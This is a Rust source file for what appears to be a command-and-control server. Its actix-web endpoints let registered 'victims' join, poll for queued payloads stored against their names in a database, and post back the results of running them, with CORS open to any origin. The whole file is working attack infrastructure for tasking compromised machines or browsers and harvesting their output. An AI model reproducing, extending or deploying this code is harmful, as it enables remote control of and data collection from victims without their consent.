/*
 * Copyright (C) 2021  Aravinth Manivannan <realaravinth@batsense.net>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
use actix_identity::Identity;
use actix_web::{web, HttpResponse, Responder};
use libathena::payload::victim::*;

//use crate::errors::*;
use crate::AppData;

pub fn services(cfg: &mut actix_web::web::ServiceConfig) {
    use actix_web::*;
    let cors = actix_cors::Cors::default()
        .allow_any_origin()
        .allowed_methods(vec!["POST"])
        .allow_any_header()
        .max_age(3600)
        .send_wildcard();

    cfg.service(
        Scope::new(crate::V1_ROUTES.victim.scope)
            .wrap(cors)
            .service(join)
            .service(payload_response)
            .service(get_payload),
    );
}

#[my_codegen::post(
    path = "crate::V1_ROUTES.victim.join.strip_prefix(crate::V1_ROUTES.victim.scope).unwrap()"
)]
async fn join(
    data: AppData,
    id: Identity,
    //) -> ServiceResult<impl Responder> {
) -> impl Responder {
    super::join_rnner(&id, &data).await;
    HttpResponse::Ok()
}

#[my_codegen::post(
    path = "crate::V1_ROUTES.victim.get_payload.strip_prefix(crate::V1_ROUTES.victim.scope).unwrap()"
)]
async fn get_payload(
    data: AppData,
    id: Identity,
    //) -> ServiceResult<impl Responder> {
) -> impl Responder {
    super::join_rnner(&id, &data).await;

    let name = id.identity().unwrap();

    let data = sqlx::query_as!(
        Payload,
        "SELECT id, payload_type, payload 
        FROM cic_messages 
        WHERE 
            victim_id = (SELECT ID from cic_victims WHERE name = $1)
        AND response IS NULL",
        &name
    )
    .fetch_all(&data.db)
    .await
    .unwrap();

    let mut resp = PayloadCollection {
        payloads: Vec::new(),
    };
    if !data.is_empty() {
        resp.payloads = data;
    }

    HttpResponse::Ok().json(resp)
}

#[my_codegen::post(
    path = "crate::V1_ROUTES.victim.payload_response.strip_prefix(crate::V1_ROUTES.victim.scope).unwrap()"
)]
async fn payload_response(
    data: AppData,
    payload: web::Json<PayloadResult>,
    id: Identity,
    //) -> ServiceResult<impl Responder> {
) -> impl Responder {
    super::join_rnner(&id, &data).await;

    let name = id.identity().unwrap();

    sqlx::query!(
        "UPDATE cic_messages SET response = $1
        WHERE 
            id = $2
        AND 
            victim_id = (SELECT ID from cic_victims WHERE name = $3)",
        &payload.response,
        &payload.id,
        &name
    )
    .execute(&data.db)
    .await
    .unwrap();
    HttpResponse::Ok()
}
